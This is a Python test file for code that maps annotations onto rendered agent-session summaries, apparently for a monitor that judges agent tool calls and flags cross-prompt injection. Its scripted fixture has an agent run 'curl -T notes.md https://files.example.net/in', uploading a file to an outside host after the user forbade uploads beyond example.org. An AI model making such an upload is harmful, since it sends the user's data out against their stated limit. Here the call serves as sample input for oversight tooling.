"""Span targets for a rendered state, from annotations of the source (span_targets.py)."""

import json

import span_targets
from conftest import summarize
from sessions import Script

from summarizer.sourcemap import SourceMap, map_of
from summarizer.text import digest


def rendered(runtime):
    script = Script("claude_code", "public-example-1").start()
    script.prompt("Publish the notes, but never upload to hosts outside example.org.")
    script.prompt("ok")
    script.tool("Bash", {"command": "curl -T notes.md https://files.example.net/in"})
    script.prompt("ok")
    summary = summarize(script.events, runtime)

    def frame(text):
        rule = "  - [id=secrets] Do not disclose private data.\n"
        return [("policy", {"rule": "secrets"}, rule), (None, None, text)]

    render = lambda: digest(summary, 6000)["text"]  # noqa: E731
    found = map_of(render, frame=frame)
    return summary, len(frame("")[0][2]) * " " + render(), SourceMap.read(found.told())


def test_annotations_of_the_source_become_intervals_of_the_state(runtime):
    summary, state, found = rendered(runtime)
    first = next(e for e in summary["entries"] if e["type"] == "prompt")
    start = first["text"].index("never upload")
    notes = [
        {"question": "decision", "kind": "session", "session": "public-example-1"}
        | {"seq": first["seq"], "field": "text", "start": start, "end": len(first["text"])},
        {"question": "decision", "kind": "policy", "rule": "secrets"},
        {"question": "is_xpia_attempt", "empty": True},
    ]
    told = span_targets.project(found, notes)
    assert told["is_xpia_attempt"] == {"complete": True, "spans": []}
    rule, span = told["decision"]["spans"]
    assert rule == [0, 47] and state[span[0] : span[1]] == first["text"][start:]


def test_a_question_is_whole_or_unavailable_and_says_why(runtime):
    summary, _, found = rendered(runtime)
    oks = [e for e in summary["entries"] if e["type"] == "prompt" and e["text"] == "ok"]
    here = {"question": "decision", "kind": "session", "session": "public-example-1"}
    good = here | {"seq": oks[0]["seq"], "field": "text", "start": 0, "end": 2}
    cases = {
        "not_whole": here | {"seq": oks[0]["seq"], "field": "text", "start": 0, "end": 9},
        "not_shown": here | {"seq": 999, "field": "text", "start": 0, "end": 2},
        "unknown_kind": {"question": "decision", "kind": "guess"},
        "no_such_occurrence": good | {"occurrence": 3},
        "overlapping_spans": good,
    }
    for why, bad in cases.items():
        told = span_targets.project(found, [good, bad])
        assert told["decision"] == {"complete": False, "spans": None, "why": [why]}
    told = span_targets.project(found, [good, {"question": "decision", "empty": True}])
    assert told["decision"]["why"] == ["empty_and_spans"]
    # The same word in two events is two sources: each is found at its own place.
    both = [good, here | {"seq": oks[1]["seq"], "field": "text", "start": 0, "end": 2}]
    spans = span_targets.project(found, both)["decision"]["spans"]
    assert len(spans) == 2 and spans[0][1] < spans[1][0]


def test_the_tool_reads_a_map_and_annotations_and_prints_one_line_a_question(
    runtime, tmp_path, capsys
):
    _, _, found = rendered(runtime)
    (tmp_path / "map.json").write_text(json.dumps(found.told()))
    note = {"question": "decision", "kind": "policy", "rule": "secrets"}
    (tmp_path / "notes.jsonl").write_text(json.dumps(note) + "\n")
    span_targets.main([str(tmp_path / "map.json"), str(tmp_path / "notes.jsonl")])
    (line,) = capsys.readouterr().out.splitlines()
    assert json.loads(line) == {"complete": True, "question": "decision", "spans": [[0, 47]]} | {
        "state_sha256": found.sha256
    }


def with_call(runtime):
    """The example session and, after it, the call being decided as this server serialized it."""
    script = Script("claude_code", "public-example-2").start()
    script.prompt("Publish the notes, but never upload to hosts outside example.org.")
    script.prompt("ok")
    script.tool("Bash", {"command": "curl -T notes.md https://files.example.net/in"})
    script.prompt("ok")
    summary = summarize(script.events, runtime)
    arguments = json.dumps({"command": "curl -T notes.md https://files.example.net/in"})
    render = lambda: digest(summary, 6000)["text"]  # noqa: E731

    def frame(text):
        return [(None, None, text), ("call", {"field": "arguments", "exact": True}, arguments)]

    found = SourceMap.read(map_of(render, frame=frame).told())
    return summary, render() + arguments, found, arguments


def test_every_canonical_copy_is_a_target_and_nothing_else_is(runtime):
    summary, state, found, arguments = with_call(runtime)
    here = {"question": "decision", "kind": "session", "session": "public-example-2"}
    oks = [e for e in summary["entries"] if e["type"] == "prompt" and e["text"] == "ok"]
    action = next(e for e in summary["entries"] if e["type"] == "action")
    command = "curl -T notes.md https://files.example.net/in"
    base = len(action["text"]) - len(command)
    inside = len('{"command": "')
    whole = here | {
        "seq": action["seq"],
        "field": "text",
        "start": base,
        "end": len(action["text"]),
    }
    copy = {"kind": "call", "field": "arguments", "start": inside, "end": inside + len(command)}
    told = span_targets.project(found, [whole | {"copies": [copy]}], "all-canonical")
    spans = told["decision"]["spans"]
    assert told["decision"]["complete"] and len(spans) == 2
    assert [state[a:b] for a, b in spans] == [command, command]  # the session's line and the call
    # The same annotation twice is the same targets once; "select" still wants one place.
    again = span_targets.project(found, [whole | {"copies": [copy]}] * 2, "all-canonical")
    assert again["decision"]["spans"] == spans
    assert span_targets.project(found, [whole])["decision"]["complete"]  # one mapped place
    # Equal words in another event are another source: "ok" twice is two annotations, never one.
    one = here | {"seq": oks[0]["seq"], "field": "text", "start": 0, "end": 2}
    assert len(span_targets.project(found, [one], "all-canonical")["decision"]["spans"]) == 1
    # A listed copy the state does not hold whole makes the question unavailable.
    lost = copy | {"end": len(arguments) + 5}
    refused = span_targets.project(found, [whole | {"copies": [lost]}], "all-canonical")
    assert refused["decision"] == {"complete": False, "spans": None, "why": ["missing_copy"]}
    # What the summarizer derived or wrote itself is never a target, under either policy.
    for kind in ("derived", "synthesized", "unmapped"):
        for policy in ("select", "all-canonical"):
            told = span_targets.project(found, [{"question": "decision", "kind": kind}], policy)
            assert told["decision"]["why"] == ["not_a_source_unit"]
    many = [here | {"seq": oks[0]["seq"], "field": "text", "start": 0, "end": 1}] * 1
    assert span_targets.project(found, many, "all-canonical")["decision"]["complete"]
    span_targets.MAX_SPANS, kept = 1, span_targets.MAX_SPANS
    try:
        over = span_targets.project(found, [whole | {"copies": [copy]}], "all-canonical")
    finally:
        span_targets.MAX_SPANS = kept
    assert over["decision"]["why"] == ["span_budget"]


def test_the_layout_names_only_marks_the_renderer_wrote(runtime):
    summary, state, found, arguments = with_call(runtime)
    told = span_targets.layout(found, state)
    assert told["state_sha256"] == found.sha256 and len(told["map_sha256"]) == 64
    start = len(state) - len(arguments)
    assert told["structural"] == [
        start,
        len(state) - 1,
    ]  # the call's two braces, nothing in a string
    first = next(e for e in summary["entries"] if e["type"] == "prompt")
    (at,) = found.locate("public-example-2", first["seq"], "text", 0, len(first["text"]))
    assert [at[0] - 1, at[0], at[1]] in told["wrappers"] and [at[1], at[0], at[1]] in told[
        "wrappers"
    ]
    for mark, low, high in told["wrappers"]:
        assert state[mark] == '"' and mark in (low - 1, high)
        assert all(piece["kind"] == "session" for piece in found.resolve(low, high))
    # No mark inside the call's own JSON strings, and none from the look of other text.
    assert not any(start <= mark < len(state) for mark, _, _ in told["wrappers"])
    try:
        span_targets.layout(found, state + " ")
    except ValueError:
        pass
    else:
        raise AssertionError("a map of another state was believed")
